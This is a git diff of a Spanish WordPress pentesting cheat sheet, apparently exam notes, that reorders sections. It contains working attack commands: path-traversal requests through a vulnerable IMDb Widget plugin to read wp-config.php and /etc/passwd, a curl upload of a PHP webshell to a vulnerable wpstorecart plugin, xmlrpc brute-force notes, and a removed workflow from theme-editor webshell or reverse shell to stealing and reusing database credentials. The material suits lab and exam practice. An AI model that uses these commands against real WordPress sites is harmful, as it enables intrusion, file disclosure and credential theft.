@@ -66,7 +66,7 @@ admin:password
 # Iterar para encontrar varios usuarios
 ```
 
-## 3. WPSCAN — ENUMERACIÓN COMPLETA
+## 2. WPSCAN — ENUMERACIÓN COMPLETA
 
 ### Escaneo básico
 ```bash
@@ -113,7 +113,22 @@ admin:password
 # Fuerza bruta vía xmlrpc → más rápido → sin rate limiting
 ```
 
-## 4. WPPROBE
+### LFI vía plugins vulnerables 
+```bash
+# Plugin IMDb Widget 1.0.8 → LFI en pic.php
+❯ http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
+# Descarga la imagen → cambiar extensión a .txt → leer contenido
+
+❯ wget "http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php" -O output.txt
+# Guardar directamente como .txt → leer el contenido
+
+# Paths útiles para LFI en WordPress
+../../../wp-config.php
+../../../../etc/passwd
+../../../wp-content/uploads/<archivo>
+```
+
+## 3. WPPROBE
 
 ```bash
 ❯ wpprobe http://<IP>/
@@ -126,7 +141,7 @@ admin:password
 # Instalar si no está disponible
 ```
 
-## 5. XMLRPC.PHP — ENUMERACIÓN Y FUERZA BRUTA
+## 4. XMLRPC.PHP — ENUMERACIÓN Y FUERZA BRUTA
 
 Si esta expuesto, podemos enumerar credenciales validas y solo acepta peticiones por **POST** y que este estructurada en **XML**
 * Debemos de listar los métodos y lo haremos con el código del archivo y ver si existe el siguiente **wp.getUsersBlogs** y después aplicar fuerza bruta.
@@ -203,7 +218,7 @@ done
 
 ---
 
-## 6. OBTENER RCE — PANEL DE ADMINISTRACIÓN
+## 5. OBTENER RCE — PANEL DE ADMINISTRACIÓN
 
 ### Opción 1 — Editar tema existente (más rápido)
 ```bash
@@ -357,52 +372,4 @@ Para la forma 3:
 ❯ curl -F "Filedata=@./shell.php" http://<IP>/wp-content/plugins/wpstorecart/php/upload.php
 # Requiere plugin wpstorecart vulnerable
 # Acceder: http://IP/wp-content/plugins/wpstorecart/shell.php
-```
-
----
-
-## 7. LFI VÍA PLUGINS VULNERABLES
-
-```bash
-# Plugin IMDb Widget 1.0.8 → LFI en pic.php
-❯ http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
-# Descarga la imagen → cambiar extensión a .txt → leer contenido
-
-❯ wget "http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php" -O output.txt
-# Guardar directamente como .txt → leer el contenido
-
-# Paths útiles para LFI en WordPress
-../../../wp-config.php
-../../../../etc/passwd
-../../../wp-content/uploads/<archivo>
-```
-
----
-
-## 8. BUSCAR PLUGINS VULNERABLES
-
-```bash
-❯ searchsploit wordpress <nombre_plugin>
-❯ searchsploit wordpress <nombre_plugin> <version>
-# Buscar exploit por nombre y versión del plugin
-
-❯ curl -s "http://<IP>/wp-content/plugins/<plugin>/readme.txt" | grep -i "stable tag\|version"
-# Ver versión exacta del plugin instalado
-
-# Con API token de wpscan → CVEs automáticos
-❯ wpscan --url http://<IP>/ -e vp --api-token="<TOKEN>"
-```
-
----
-
-## FLUJO EN EL EXAMEN
-
-```
-1. whatweb + wpscan básico → versión WP e info inicial
-2. wpscan -e u,vp --api-token → usuarios + plugins vulnerables
-3. curl grep plugins → lista de plugins → searchsploit por cada uno
-4. Plugin vulnerable → explotar directamente
-5. Sin plugin → fuerza bruta al login o vía xmlrpc
-6. Panel admin → Appearance → Theme Editor → 404.php → webshell/revshell
-7. Shell obtenida → cat wp-config.php → credenciales DB → reutilizar
 ```
